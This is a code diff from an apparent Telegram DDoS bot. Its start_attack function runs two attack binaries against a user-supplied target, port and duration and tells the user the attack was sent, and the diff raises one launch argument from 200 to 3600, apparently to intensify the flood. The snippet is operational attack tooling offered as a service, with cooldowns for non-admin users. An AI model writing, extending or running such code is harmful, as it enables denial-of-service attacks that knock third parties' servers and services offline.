@@ -263,9 +263,9 @@ def start_attack(user_id, target, port, duration):
     response = f"🚀 𝗔𝘁𝘁𝗮𝗰𝗸 𝗦𝗲𝗻𝘁 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆! 🚀\n\n𝗧𝗮𝗿𝗴𝗲𝘁: {target}:{port}\n𝗔𝘁𝘁𝗮𝗰𝗸 𝗧𝗶𝗺𝗲: {duration}\n𝗔𝘁𝘁𝗮𝗰𝗸𝗲𝗿 𝗡𝗮𝗺𝗲: {username}"
     bot.send_message(user_id, response)
     try:
-        ongoing_attacks[attack_id] = subprocess.Popen(f"./{bgmi_file} {target} {port} {duration} 200", shell=True)
+        ongoing_attacks[attack_id] = subprocess.Popen(f"./{bgmi_file} {target} {port} {duration} 3600", shell=True)
         time.sleep(5)
-        subprocess.run(f"./{sahil_file} {target} {port} {duration} 200", shell=True)
+        subprocess.run(f"./{sahil_file} {target} {port} {duration} 3600", shell=True)
       # Set cooldown for normal users after a successful attack
         if user_id not in ADMIN_IDS:
             user_cooldowns[user_id] = datetime.datetime.now()
